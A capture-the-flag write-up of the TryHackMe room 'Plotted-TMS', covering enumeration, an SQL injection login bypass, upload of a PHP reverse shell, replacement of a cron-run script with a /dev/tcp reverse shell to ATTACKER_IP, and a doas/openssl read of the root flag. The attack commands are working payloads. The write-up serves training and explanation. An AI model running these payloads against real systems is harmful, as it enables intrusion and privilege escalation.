# Plotted-TMS — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Plotted-TMS  
**Difficulty:** Easy  
**Date:** 2026-05-20  
**Tags:** SQLi Authentication Bypass, PHP File Upload, Cron Job Abuse, Directory Permissions, doas, OpenSSL GTFOBins

---

## Overview

This room features a Traffic Offense Management System (TOMS) by oretnom23 — a notoriously insecure PHP application from SourceCodester. The attack chain involves bypassing SQL authentication on the admin panel, uploading a PHP reverse shell through unrestricted file upload, abusing a cron job misconfiguration for lateral movement, and leveraging `doas` with `openssl` for privilege escalation to root.

- **User flag:** `77927???badb`
- **Root flag:** `53f8???0a9bdcab`

---

## MITRE ATT&CK Mapping

| TTP | Technique | Description |
|-----|-----------|-------------|
| T1595.001 | Active Scanning: Port Scanning | nmap scan across ports 22, 80, 445 |
| T1190 | Exploit Public-Facing Application | SQLi bypass on TOMS login form |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | PHP reverse shell for initial access |
| T1078 | Valid Accounts | SQLi-obtained session used to access admin panel |
| T1505.003 | Server Software Component: Web Shell | PHP shell uploaded via admin file upload |
| T1053.003 | Scheduled Task/Job: Cron | Cron job running backup.sh as plot_admin every minute |
| T1222.002 | File and Directory Permissions Modification: Linux | Directory owned by www-data allowed replacing plot_admin's script |
| T1548 | Abuse Elevation Control Mechanism | doas + openssl used to read root flag |

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O -A 10.65.172.154
```

Key findings:

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80 | HTTP | Apache 2.4.41 — Ubuntu Default Page |
| 445 | HTTP | Apache 2.4.41 — Ubuntu Default Page (NOT SMB) |

Important observation: **port 445 is HTTP, not SMB**. The `smb2-time` script returned "Protocol negotiation failed (SMB2)", confirming this is a second Apache instance. This is an intentional misdirection — a pentester might skip it assuming it's SMB.

### Gobuster (Port 80)

```bash
gobuster dir -u http://10.65.172.154 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

Results:

| Path | Status | Size | Notes |
|------|--------|------|-------|
| /index.html | 200 | 10918 | Apache default page |
| /admin | 301 | 314 | Redirect to /admin/ |
| /shadow | 200 | 25 | Rabbit hole |
| /passwd | 200 | 25 | Rabbit hole |

Both `/shadow` and `/passwd` decode from base64 to `not this easy :D`. The `/admin/id_rsa` file also decodes to `Trust me it is not this easy..now get back to enumeration :D`. All three are deliberate traps — the 25-byte size should immediately signal that these are not real system files.

### Gobuster (Port 445)

```bash
gobuster dir -u http://10.65.172.154:445/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

| Path | Status | Notes |
|------|--------|-------|
| /management | 301 | **Traffic Offense Management System** |

This is where the real application lives.

### Application Identification

Viewing the page source of `http://10.65.172.154:445/management/` revealed:

- `<title>Traffic Offense Management System</title>`
- `Copyright © TOMS 2021` in the footer
- `Developed By: oretnom23@gmail.com` in the footer
- `var _base_url_ = '/management/';` — base path for AJAX calls
- Login button pointing to `/management/admin`

**oretnom23** is a developer who publishes dozens of PHP projects on SourceCodester.com. These applications are known for having zero security controls and are frequently used in CTF rooms. A `searchsploit "traffic offense management"` returned 7 exploits including multiple unauthenticated RCE chains.

### Gobuster (Management App)

```bash
gobuster dir -u http://10.65.172.154:445/management/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

Key directories discovered:

| Path | Notes |
|------|-------|
| /uploads | File upload directory — listing enabled |
| /classes | Backend PHP handlers |
| /database | Potential SQL dump exposure |
| /admin | Admin panel |
| /pages | Application pages |
| /config.php | Empty (0 bytes) — config loaded elsewhere |

### Login Endpoint Analysis

Inspecting `/management/dist/js/script.js` revealed the AJAX login handler:

```javascript
$.ajax({
    url: _base_url_ + 'classes/Login.php?f=login',
    method: 'POST',
    data: $(this).serialize(),
    ...
})
```

This confirmed the backend endpoint: `/management/classes/Login.php?f=login`. The frontend form at `/management/admin/login.php` is just the HTML wrapper — the SQL query happens in the backend handler.

---

## Initial Access — SQLi Authentication Bypass + File Upload

### SQL Injection

Using the known exploit pattern from Exploit-DB (#50244), tested SQLi bypass on the backend endpoint:

```bash
curl -X POST "http://10.65.172.154:445/management/classes/Login.php?f=login" \
  -d "username=admin' or '1'='1'#&password=" -v
```

Response:

```
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=2bbap8qml2t7hatarno0vs97tf; path=/
Content-Length: 20

{"status":"success"}
```

The classic `' or '1'='1'#` payload bypasses authentication because the backend query is something like:

```sql
SELECT * FROM users WHERE username='admin' or '1'='1'#' AND password='...'
```

The `#` comments out the password check entirely.

### PHP Reverse Shell Upload

After logging into the admin panel via browser (using the same SQLi payload as username), navigated to the user management section which allows avatar/photo uploads with no file type validation.

Prepared a PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

Started a listener and triggered the shell:

```bash
nc -lvnp 4444
curl "http://10.65.172.154:445/management/uploads/1779313740_shell.php"
```

Result: shell as `www-data`.

```
www-data@plotted:/var/www/html/445/management/uploads$ whoami
www-data
```

---

## Lateral Movement — www-data → plot_admin

### Cron Job Discovery

```bash
cat /etc/crontab
```

```
* *  * * *  plot_admin /var/www/scripts/backup.sh
```

A cron job runs `/var/www/scripts/backup.sh` as `plot_admin` **every minute**. The script performs an rsync backup of the web application.

### Directory vs File Permissions — The Key Insight

```bash
ls -la /var/www/scripts/
```

```
drwxr-xr-x 2 www-data   www-data   4096 .          ← directory owned by www-data
-rwxrwxr-- 1 plot_admin plot_admin  141  backup.sh  ← file owned by plot_admin
```

The file `backup.sh` belongs to `plot_admin` with permissions `rwxrwxr--`. As www-data (others), we only have `r--` — we cannot edit the file directly.

**However**, the directory `/var/www/scripts/` is owned by `www-data` with `rwx` permissions. In Linux, the ability to delete or create files is determined by permissions on the **directory**, not the file itself. Since www-data owns the directory, we can delete the file and create a replacement — even though the file belongs to another user.

This is the admin's misconfiguration: the cron job runs a script as `plot_admin`, but the script lives in a directory owned by `www-data`. The fix would be:

```bash
# Correct ownership:
chown plot_admin:plot_admin /var/www/scripts/
```

### Exploitation

```bash
rm /var/www/scripts/backup.sh
cat > /var/www/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1
EOF
chmod +x /var/www/scripts/backup.sh
```

Started a second listener on port 5555 and waited for the cron job to fire:

```bash
nc -lvnp 5555
```

Within a minute, received a shell as `plot_admin`:

```
plot_admin@plotted:~$ cat user.txt
77927510d5edacea1f9e86602f1fbadb
```

---

## Privilege Escalation — plot_admin → root

### SUID Discovery

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among standard SUID binaries, one stood out: `/usr/bin/doas`. This is an OpenBSD alternative to sudo, rarely seen on Ubuntu — a clear signal it was placed intentionally.

### doas Configuration

```bash
cat /etc/doas.conf
```

```
permit nopass plot_admin as root cmd openssl
```

This allows `plot_admin` to run `openssl` as root without a password.

### Reading the Root Flag

Using `openssl enc` to read files as root (GTFOBins technique):

```bash
doas openssl enc -in /root/root.txt
```

```
Congratulations on completing this room!
53f85e2da3e874426fa059040a9bdcab
Hope you enjoyed the journey!
Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

---

## Mistakes I Made

| Mistake | Impact | Lesson |
|---------|--------|--------|
| Typo in IP address: curled `10.66.172.154` instead of `10.65.172.154` | Multiple hung curl sessions, wasted time | Always copy-paste IPs, never type from memory |
| Investigated `/shadow`, `/passwd`, `/admin/id_rsa` as potential real files | Time spent on rabbit holes | Check file size first — 25 bytes is not a real shadow/passwd file |
| Initially assumed port 445 was SMB | Could have missed the entire web application | Always verify with nmap — service detection matters more than port number conventions |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning, service/OS detection |
| gobuster | Directory and file enumeration on ports 80 and 445 |
| curl | Manual HTTP requests, SQLi testing, shell triggering |
| searchsploit | Finding known exploits for TOMS |
| nc (netcat) | Reverse shell listeners |
| base64 | Decoding rabbit hole content |
| Browser (view-source) | Source code analysis, JavaScript inspection |

---

## Key Takeaways

1. **Port numbers lie.** Port 445 is conventionally SMB, but here it's HTTP. Always trust nmap service detection over port conventions.

2. **Rabbit holes are part of the game.** Three decoy files (`/shadow`, `/passwd`, `/admin/id_rsa`) were designed to waste time. Quick sanity checks (file size, base64 decode) save you from going deep on fake leads.

3. **Frontend vs backend endpoints.** The login form at `/admin/login.php` is just HTML — the actual SQL query happens at `/classes/Login.php?f=login`. SQLi testing targets the backend handler, not the frontend.

4. **Directory permissions ≠ file permissions.** The ability to delete/create files depends on the **directory** permissions. A file owned by user A inside a directory owned by user B means user B can replace it — a critical misconfiguration pattern in cron-based privilege escalation.

5. **oretnom23 = vulnerable by design.** Seeing this developer name in a CTF footer is a strong signal to search for known exploits immediately.

6. **doas is rare on Ubuntu.** Its presence signals intentional placement for the CTF — treat unusual SUID binaries as hints, not noise.
